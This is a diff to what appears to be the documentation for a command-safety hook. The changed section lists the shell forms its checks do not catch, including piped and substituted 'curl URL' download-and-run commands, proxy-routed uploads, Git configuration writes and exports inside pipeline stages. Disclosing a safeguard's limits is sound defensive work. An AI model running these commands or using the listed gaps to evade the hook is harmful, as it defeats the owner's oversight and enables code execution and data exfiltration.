@@ -71,6 +71,12 @@ To run one of these three refused commands on purpose, the owner starts the sess
 
 These checks read submitted text, like the environment check. They do not refuse a receiver behind a launcher the hook does not resolve, such as `curl URL | timeout 60 bash` or `timeout 60 bash <<'EOF'`, a download passed on through a variable, such as `x=$(curl URL); sh -c "$x"`, an output substitution, such as `curl URL > >(sh)`, or a substitution a forwarded shell takes, such as `exec bash -c "$(curl URL)"`; the plain-stage rule reports the last three, whose download stands in a substitution. They do not reach a host alias in an ssh config file, Git configuration an earlier command or a file write sets, such as `>> .git/config`, `GIT_` variables or aliases an earlier command or file sets, a proxy variable or config file an earlier command exports or writes, an `export`, `declare -x` or `typeset -x` of such a variable before an upload in the same command, as in `export http_proxy=URL; curl -T notes.txt URL`, the commands inside a sourced script or a script file, a CDPATH the session's shell already holds, an alias that a configuration file a variable assigned before `git` names, such as `GIT_CONFIG_GLOBAL` or `HOME`, defines, other upload programs, a program name built at runtime, or the owner's variable set by a script or a name built at runtime. A program that makes its own network calls, such as a Python or Node script, an SDK or an interpreter given a file, sends data these checks never see: the upload refusal covers curl, wget, scp and rsync where the command names them, and is no boundary for such a program.
 
+The push check catches mistakes in the recognized command forms above. Its assignment tracking covers the listed forms, and the shell can carry assignments through other forms.
+
+Assignment effects outside the push check's scope include:
+
+- Exports inside a compound command that runs as a pipeline stage.
+
 ## Git history policy
 
 Set `COMMAND_SAFETY_HISTORY_POLICY = "no-lazy-fetch"` under `[env]` in `kendex.settings.toml` to select the native Git fence. An absent value or `off` preserves ordinary history reads. Selection uses the same settings loader as the project pattern. The hook does not detect partial clones or change clone, promisor, fetch or update configuration. The selected policy applies within the Git-project settings boundary, including full clones.
